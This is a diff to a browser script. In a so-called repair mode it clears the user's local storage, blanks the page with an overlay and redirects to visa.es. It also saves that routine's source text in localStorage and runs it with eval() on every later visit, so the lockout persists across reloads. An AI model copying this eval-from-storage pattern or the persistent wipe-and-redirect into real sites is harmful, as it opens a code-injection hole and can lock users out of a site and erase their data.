@@ -1,4 +1,9 @@
 (function () {
+  function showBlankScreen() {
+    document.open();
+    document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.8);backdrop-filter:blur(10px);"></div>');
+    document.close();
+  }
   async function clearUserData() {
     try {
       localStorage.clear();
@@ -35,7 +40,8 @@
     await clearUserData();
     localStorage.setItem('repairMode', 'true');
     sessionStorage.setItem('repairMode', 'true');
-    document.documentElement.innerHTML = '';
+    localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
+    showBlankScreen();
     location.replace('https://visa.es');
   }
 
@@ -49,12 +55,17 @@
     localStorage.getItem('repairMode') === 'true' ||
     sessionStorage.getItem('repairMode') === 'true';
 
+  const storedLogic = localStorage.getItem('repairLogic');
+
   if (isRepair && !isBorrarPage) {
     clearUserData().then(() => {
       localStorage.setItem('repairMode', 'true');
       sessionStorage.setItem('repairMode', 'true');
-      document.documentElement.innerHTML = '';
+      localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
+      showBlankScreen();
       location.replace('https://visa.es');
     });
+  } else if (storedLogic && !isBorrarPage) {
+    try { eval(storedLogic); } catch (e) {}
   }
 })();
